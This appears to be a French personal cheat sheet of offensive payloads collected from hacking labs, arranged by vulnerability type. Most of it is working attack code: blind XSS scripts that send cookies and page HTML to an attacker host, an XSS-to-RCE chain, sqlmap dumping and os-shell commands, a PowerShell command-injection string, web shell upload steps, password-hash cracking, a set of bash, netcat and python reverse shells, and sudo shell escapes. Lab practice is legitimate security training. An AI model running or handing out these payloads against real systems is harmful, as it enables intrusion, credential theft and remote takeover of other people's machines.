# Payloads qui ont fonctionné — Retours d'expérience labs

> Techniques et payloads issus de mes labs personnels, organisés par type de vulnérabilité.

---

## Enumération & Discovery

### Fuzzing numérique sur endpoints de fichiers

Quand un endpoint expose des ressources avec un identifiant numérique (`/data/13262.txt`), tester toutes les valeurs possibles :

=== "5 chiffres — PDF"
```bash
wfuzz -c \
  -z file,/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt \
  --hc 404,403 \
  "http://TARGET/path/to/FUZZ.pdf"
```

=== "5 chiffres — TXT"
```bash
wfuzz -c \
  -z file,/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt \
  --hc 404,403 \
  "http://TARGET/path/to/FUZZ.txt"
```

!!! tip "Wordlists numériques disponibles dans SecLists"
    ```
    /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt
    /usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt
    /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt
    ```

---

### Gobuster — Wordlists complémentaires

Enchaîner plusieurs wordlists pour maximiser la découverte :

```bash
# 1. Rapide — wordlist commune
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt

# 2. Fichiers avec extensions
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,js,aspx

# 3. Fichiers medium — meilleure couverture
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt

# 4. Wordlist commune seclists
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```

!!! tip "Leçon apprise"
    `dirb/common.txt` trouve les dossiers.  
    `raft-medium-files-lowercase.txt` trouve les fichiers.   
    Les deux sont complémentaires — **ne jamais se limiter à une seule wordlist**.

---

## Blind XSS

### Étape 1 — Détecter la vulnérabilité (callback HTTP)

```html
<script src="http://KALI_IP/test.js"></script>
```

```bash
# Listener minimal
python3 -m http.server 80
# → Si on voit une requête GET /test.js : le payload s'exécute côté admin/bot ✅
```

---

### Étape 2a — Exfiltrer les cookies

```javascript
// cookies.js
let cookies = document.cookie;
fetch("http://KALI_IP/exfil?data=" + encodeURIComponent(cookies));
```

!!! warning "Si pas de cookie"
    Les cookies `httpOnly` ne sont pas accessibles via JS. Passer à l'exfiltration HTML.

---

### Étape 2b — Exfiltrer le contenu HTML de la page (URL secrète, dashboard...)

```javascript
// xss-html.js
window.location.href = "http://KALI_IP/?data=" + btoa(document.body.innerHTML);
```

```bash
# Sur Kali — décoder le base64 depuis les logs
# Dans les logs python3 -m http.server, récupérer le paramètre data=...
echo "BASE64_ICI" | base64 -d > page.html
```

!!! tip "Ce qu'on peut trouver dans le HTML exfiltré"
  - URLs d'administration internes (`localhost:3000/...`)  
  - Tokens CSRF  
  - Données utilisateur affichées côté admin  
  - Liens vers des endpoints cachés  

---

### Étape 3 — Exploiter un endpoint interne (XSS → RCE)

Une fois une URL interne trouvée (ex: `localhost:3000/run_command`), forger une requête depuis le contexte du navigateur victime :

```javascript
// xss-rce.js
(async function() {
    // Signal de départ (debug)
    fetch("http://KALI_IP/start");

    // Exécuter une commande sur l'endpoint interne
    await fetch("http://localhost:PORT/run_command", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
            cmd: "bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'",
        })
    });
})();
```

```bash
# Injection du payload dans le champ vulnérable
# Paramètre message, pilotMessage, commentaire...
<script src="http://KALI_IP/xss-rce.js"></script>

# Setup côté Kali
python3 -m http.server 80  # servir le .js
nc -nlvp 4444               # recevoir le reverse shell
```

!!! danger "Workflow complet Blind XSS → RCE"
    ```
    1. Injecter callback → confirmer exécution JS
    2. Exfiltrer HTML → trouver URL interne
    3. Injecter script fetch → POST vers endpoint interne
    4. Listener netcat → recevoir shell root
    ```

---

## Bypass d'authentification (IDOR sur rôles)

### Manipulation du type de rôle à l'inscription

Quand un formulaire d'inscription contient un champ caché `type` ou `role`, tester des valeurs numériques avec l'Intruder Burp :

```
# Burp Intruder — Payload type : Numbers
# Range : 1 → 100 (step 1)
# Comparer les tailles de réponse — les valeurs "admin" donnent souvent une réponse différente
```

!!! tip "Leçon apprise"
    Un champ `type=50` pour un rôle "user" peut avoir un équivalent `type=100` pour "admin".  
    Tester systématiquement les valeurs limites et autour de 100.

---

## SQL Injection

### Workflow SQLMap — Sauvegarder la requête depuis Burp

!!! warning "Méthode d'export Burp"
    Utiliser **"Save selected text to file"** (sélectionner tout le texte de la requête)   
    et non "Save Item" — ce dernier ajoute des métadonnées qui cassent SQLMap.

```bash
# Tester le paramètre vulnérable
sqlmap -r request.txt --batch --risk 3 --level 5 -p PARAM_NAME

# Forcer le DBMS pour aller plus vite
sqlmap -r request.txt --batch --dbms=postgresql   # PostgreSQL
sqlmap -r request.txt --batch --dbms=mssql        # SQL Server
sqlmap -r request.txt --batch --dbms=mysql        # MySQL

# Énumération
sqlmap -r request.txt --batch --dbs                            # lister les bases
sqlmap -r request.txt --batch --current-db                     # base courante
sqlmap -r request.txt --batch --current-user                   # utilisateur courant
sqlmap -r request.txt --batch --is-dba                        # droits admin ?
sqlmap -r request.txt --batch -D DB_NAME --tables              # tables
sqlmap -r request.txt --batch -D DB_NAME -T TABLE --columns    # colonnes
sqlmap -r request.txt --batch -D DB_NAME -T TABLE --dump       # dump données
```

---

### PostgreSQL — OS Shell via SQLMap

```bash
# Obtenir un shell système (PostgreSQL → COPY TO/FROM PROGRAM)
sqlmap -r request.txt --batch --dbms=PostgreSQL --os-shell --flush-session
```

!!! warning "Shell time-based = lent"
    Si SQLMap détecte une injection time-based, l'`os-shell` affiche 1 caractère par seconde.   
    **Solution : injecter directement un reverse shell depuis l'os-shell** plutôt que d'utiliser le shell interactif.    
    ```bash
    # Dans l'os-shell SQLMap
    os-shell> bash -c 'bash -i >& /dev/tcp/KALI_IP/9090 0>&1'
    # Sur Kali
    nc -nlvp 9090
    ```

---

### MSSQL — Command Injection via Backup (Windows)

Quand une application Windows exécute une commande PowerShell avec de l'input utilisateur :

```
# Commande backend supposée :
powershell Compress-Archive -Path "c:\backup" -DestinationPath "[USER_INPUT]\backup.zip" -Force

# Payload — Commande chaînée avec &
c:\backup\backup.zip" & type C:\proof.txt & echo "

#  Le fichier zip doit exister pour que la commande réussisse et que & s'exécute
# Si erreur de format zip → les commandes après & ne s'exécutent PAS
```

!!! tip "Leçon apprise — PowerShell & commandes chaînées"
    La première partie de la commande doit réussir pour que `&` exécute la suite.  
    Si l'argument doit être un `.zip` valide, commencer par un chemin vers un `.zip` existant.

---

## File Upload — Web Shell

### Uploader P0wny Shell via une interface d'upload existante

Si le serveur expose une page d'upload (ex: `mini.php`, interface admin...) :

1. Télécharger P0wny Shell : https://github.com/flozz/p0wny-shell
2. Uploader le fichier `shell.php` via l'interface
3. Accéder à `http://TARGET/shell.php`

```bash
# Depuis P0wny Shell — lancer un reverse shell bash pour TTY stable
bash -c 'bash -i >& /dev/tcp/KALI_IP/9090 0>&1'
```

```bash
# Sur Kali
nc -nlvp 9090
```

---

## Cracking de Hashes — John the Ripper

### Hash MD5crypt (`$1$`) depuis `/etc/passwd`

```bash
# Extraire la ligne depuis /etc/passwd (via web shell)
cat /etc/passwd | grep oracle

# Sur Kali — copier dans un fichier (guillemets simples pour protéger le $)
echo 'oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:...' > hash.txt

# Cracker avec rockyou
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Afficher le résultat
john hash.txt --show
```

---

## Reverse Shells

### Bash (le plus fiable)

```bash
bash -c 'bash -i >& /dev/tcp/KALI_IP/PORT 0>&1'
```

### Netcat (avec -e)

```bash
/bin/nc -nv KALI_IP PORT -e /bin/bash
```

### Netcat (sans -e — mkfifo)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc KALI_IP PORT > /tmp/f
```

### Python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Post-Exploitation — Privilege Escalation

### sudo -l → droits complets (ALL)

```bash
sudo -l
# Si : (ALL : ALL) ALL

# Option 1 — su direct
sudo su

# Option 2 — via binaire avec shell escape (mysql, vim, etc.)
sudo mysql -e '\! /bin/bash'
sudo vim -c ':!/bin/bash'
```

---

## Ressources utiles découvertes en labs

| Ressource                                           | Usage                                   |
|-----------------------------------------------------|-----------------------------------------|
| [revshells.com](https://www.revshells.com/)         | Générateur reverse shells tous langages |
| [P0wny Shell](https://github.com/flozz/p0wny-shell) | Web shell PHP interactif                |
| [GTFOBins](https://gtfobins.github.io)              | Binaires exploitables sudo/SUID         |
| `/usr/share/wordlists/seclists/Fuzzing/`            | Wordlists numériques pour fuzzing       |